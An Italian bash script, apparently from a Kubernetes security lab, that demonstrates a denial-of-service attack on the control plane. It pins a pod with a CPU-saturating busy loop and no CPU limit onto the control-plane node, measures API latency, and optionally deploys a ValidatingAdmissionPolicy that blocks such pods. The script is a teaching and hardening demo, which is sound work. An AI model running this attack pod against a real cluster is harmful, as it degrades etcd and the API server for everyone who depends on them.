#!/usr/bin/env bash
# =============================================================================
# Attacco dimostrativo A2 - Workload ostile sul nodo del control plane
#
# Riprende la misconfig 2 (STRIDE riga 8, "Workloads scheduled on control-plane
# nodes") e ne mostra lo SFRUTTAMENTO: un attaccante che puo' creare un pod lo
# schedula ESPLICITAMENTE sul nodo di controllo (nessun taint, nessuna policy lo
# vieta) e vi fa girare un carico che compete con etcd / kube-apiserver,
# degradando il control plane. E' un Denial of Service del piano di controllo.
#
# Riferimenti: NSA/CISA Kubernetes Hardening Guidance 1.2 (separazione dei
# workload dal control plane); MITRE ATT&CK T1610 "Deploy Container";
# documentazione Kubernetes su node-pressure / resource contention.
#
# DIFFERENZA COL TEST 02:
#   - 02-control-plane-scheduling.sh  VERIFICA (sola lettura) che nessuna policy
#     separi i workload dal control plane, e in LAB prova che un pod CI puo'
#     finire -- senza fare danno.
#   - questo script e' un ATTACCO: crea un pod ostile sul control plane e ne
#     DEGRADA le prestazioni, misurando la latenza dell'API prima e durante.
#
# IMPATTO E REVERSIBILITA': il carico e' limitato nel tempo
# (activeDeadlineSeconds) e usa pressione di CPU (recuperabile), non di memoria
# (che potrebbe causare OOM non recuperabili). Il pod si autodistrugge e un trap
# EXIT lo rimuove comunque. Il nodo torna normale a fine run. SOLO su Minikube.
#
# Uso:
#   ./05-attacco-control-plane-dos.sh [namespace]             # esegue l'attacco
#   DEFENSE=1 ./05-attacco-control-plane-dos.sh               # + contromisure che lo bloccano
#   ATTACK_SECS=60 ./05-attacco-control-plane-dos.sh          # durata del carico (default 45s)
# =============================================================================
set -euo pipefail

NS="${1:-smartgrid}"
DEFENSE="${DEFENSE:-0}"
ATTACK_SECS="${ATTACK_SECS:-45}"
CP_KEY="node-role.kubernetes.io/control-plane"
ATK_POD="attacco-cp-dos"
POLICY_NAME="difesa-cp-dos"
BUSYBOX_IMAGE="${BUSYBOX_IMAGE:-busybox:1.36}"

line() { printf '\n=== %s\n' "$1"; }
need() { command -v "$1" >/dev/null || { echo "serve '$1' nel PATH"; exit 1; }; }
need kubectl
kubectl get ns "$NS" >/dev/null || { echo "namespace '$NS' non trovato"; exit 1; }

CP_NODE="$(kubectl get nodes -l "$CP_KEY" -o jsonpath='{.items[0].metadata.name}')"
[ -n "$CP_NODE" ] || { echo "nessun nodo con l'etichetta $CP_KEY"; exit 1; }

# latenza media dell'API server su N chiamate, in secondi (serve 'date +%s.%N').
# Si legge una lista da etcd (i pod del namespace): è più sensibile alla
# contesa di CPU di un semplice /readyz, che l'apiserver serve dalla cache.
api_latency() {
  local n=8 start end
  start="$(date +%s.%N)"
  for _ in $(seq 1 "$n"); do kubectl get --raw="/api/v1/namespaces/${NS}/pods?limit=100" >/dev/null 2>&1 || true; done
  end="$(date +%s.%N)"
  awk -v s="$start" -v e="$end" -v n="$n" 'BEGIN{printf "%.3f", (e-s)/n}'
}

# pod ostile pinnato sul control plane; $1 = con/ senza toleration+selector
atk_manifest() {
  cat <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: $ATK_POD
  namespace: $NS
  labels: { app.kubernetes.io/name: attacco-cp-dos }
spec:
  automountServiceAccountToken: false
  terminationGracePeriodSeconds: 0
  activeDeadlineSeconds: $ATTACK_SECS
  restartPolicy: Never
  nodeSelector:
    $CP_KEY: ""
  tolerations:
  - { key: $CP_KEY, operator: Exists, effect: NoSchedule }
  containers:
  - name: hog
    image: $BUSYBOX_IMAGE
    imagePullPolicy: IfNotPresent
    # un processo busy-loop per ogni core (x2): satura la CPU del nodo
    command: ["sh","-c","n=\$(nproc 2>/dev/null || echo 4); i=0; while [ \$i -lt \$((n*2)) ]; do yes >/dev/null & i=\$((i+1)); done; wait"]
    resources:
      requests: { cpu: 50m, memory: 32Mi }   # richiesta minima: si schedula ovunque
      limits:   { memory: 128Mi }            # nessun limite di CPU: brucia quanto puo'
EOF
}

echo "ATTENZIONE: questo script degrada volutamente il control plane del cluster"
echo "'$CP_NODE' per circa ${ATTACK_SECS}s. Eseguire SOLO sul proprio Minikube."

# -----------------------------------------------------------------------------
line "1. Precondizione: il nodo del control plane accetta i workload?"
TAINTS="$(kubectl get node "$CP_NODE" -o jsonpath='{range .spec.taints[*]}{.key}:{.effect}{" "}{end}')"
echo "   nodo control plane: $CP_NODE"
echo "   taint presenti: ${TAINTS:-nessuno}"
case " $TAINTS" in
  *" $CP_KEY:NoSchedule "*|*" $CP_KEY:NoExecute "*)
    echo "   il taint del control plane C'E': senza toleration un pod non entra."
    echo "   (l'attaccante qui aggiunge la toleration; vedi DEFENSE per la policy che la blocca)" ;;
  *) echo "   NESSUN taint: qualsiasi pod puo' essere schedulato qui. Misconfig confermata." ;;
esac

cleanup() {
  set +e
  kubectl delete pod "$ATK_POD" -n "$NS" --ignore-not-found --grace-period=0 >/dev/null 2>&1
  kubectl delete validatingadmissionpolicybinding "$POLICY_NAME" --ignore-not-found >/dev/null 2>&1
  kubectl delete validatingadmissionpolicy "$POLICY_NAME" --ignore-not-found >/dev/null 2>&1
  echo "(pulizia: pod ostile e policy di laboratorio rimossi; il nodo recupera)"
}
trap cleanup EXIT

# -----------------------------------------------------------------------------
line "2. Latenza dell'API server PRIMA dell'attacco (baseline)"
BEFORE="$(api_latency)"
echo "   latenza media API (lista pod): ${BEFORE}s"

# -----------------------------------------------------------------------------
line "3. ATTACCO: schedulo un pod ostile sul control plane e lo faccio competere"
atk_manifest | kubectl apply -f -
kubectl wait pod "$ATK_POD" -n "$NS" --for=condition=Ready --timeout=60s 2>/dev/null || true
NODE="$(kubectl get pod "$ATK_POD" -n "$NS" -o jsonpath='{.spec.nodeName}' 2>/dev/null || true)"
echo "   pod ostile schedulato su: ${NODE:-Pending}"
if [ "$NODE" = "$CP_NODE" ]; then
  echo "   => ESITO PRINCIPALE: il carico ostile gira ACCANTO a etcd e kube-apiserver."
  echo "      Questa co-locazione è ciò che la misconfig rende possibile (nessuna policy la vieta)."
else
  echo "   => non schedulato sul control plane (gia' mitigato, taint/policy, o nodo saturo?): ${NODE:-Pending}"
fi

line "4. Latenza dell'API server DURANTE l'attacco (impatto, secondario)"
sleep 3   # lascio salire la contesa di CPU
DURING="$(api_latency)"
echo "   latenza media API (lista pod): ${DURING}s  (baseline ${BEFORE}s)"
awk -v b="$BEFORE" -v d="$DURING" 'BEGIN{
  if (b>0 && d>b*1.3) printf "   => DEGRADO misurabile: +%.0f%% di latenza dell API durante il carico.\n",(d/b-1)*100;
  else print "   => latenza stabile: su un nodo con core liberi e con la priorità (CPU shares) dei\n      componenti di sistema, l apiserver regge il picco. L esposizione resta la co-locazione:\n      un carico più pesante o prolungato (ATTACK_SECS maggiore) o un nodo più piccolo la rendono visibile.";
}'
echo "   eventi di pressione sul nodo (se presenti):"
kubectl get events -A --field-selector involvedObject.name="$CP_NODE" 2>/dev/null \
  | grep -Ei 'pressure|evict' | head || echo "   (nessun evento di pressione in questa finestra)"

kubectl delete pod "$ATK_POD" -n "$NS" --grace-period=0 >/dev/null 2>&1 || true
echo "   (pod ostile rimosso; il control plane torna alla baseline)"

# -----------------------------------------------------------------------------
if [ "$DEFENSE" = "1" ]; then
  line "5. [DEFENSE] Con taint + policy il pod ostile non entra sul control plane"
  echo "-- applico una ValidatingAdmissionPolicy che rifiuta i pod che tollerano/"
  echo "   selezionano il control plane (come nel test 02, POLICY=1):"
  kubectl apply -f - <<EOF
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata: { name: $POLICY_NAME }
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
    - { apiGroups: [""], apiVersions: ["v1"], operations: ["CREATE"], resources: ["pods"] }
  validations:
  - expression: >-
      !has(object.spec.tolerations) ||
      !object.spec.tolerations.exists(t,
        (has(t.key) && t.key == '$CP_KEY') ||
        (!has(t.key) && has(t.operator) && t.operator == 'Exists'))
    message: "i pod applicativi non possono tollerare il taint del control plane"
  - expression: >-
      !has(object.spec.nodeSelector) || !('$CP_KEY' in object.spec.nodeSelector)
    message: "i pod applicativi non possono chiedere il nodo del control plane"
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata: { name: $POLICY_NAME }
spec:
  policyName: $POLICY_NAME
  validationActions: [Deny]
  matchResources:
    namespaceSelector:
      matchLabels: { kubernetes.io/metadata.name: $NS }
EOF
  echo "-- rilancio lo stesso pod ostile (dry-run lato server, atteso: rifiutato):"
  OUT=""
  for _ in 1 2 3 4 5 6 7 8 9 10; do   # la policy diventa attiva entro pochi secondi
    OUT="$(atk_manifest | kubectl apply --dry-run=server -f - 2>&1 || true)"
    case "$OUT" in *denied*|*"$POLICY_NAME"*) break ;; esac
    sleep 2
  done
  echo "$OUT" | sed 's/^/   /'
  echo "   => con la policy (e un taint sul nodo) il pod ostile non puo' essere creato:"
  echo "      niente co-locazione, niente DoS del control plane."
fi

# -----------------------------------------------------------------------------
echo
echo "CONCLUSIONE: senza taint/policy un attaccante che puo' creare un pod sceglie"
echo "il nodo del control plane e vi mette un carico che rallenta etcd/apiserver."
echo "Contromisure (README sez. 2): taint NoSchedule sul control plane, worker"
echo "dedicati, ValidatingAdmissionPolicy, ResourceQuota/LimitRange e PriorityClass."
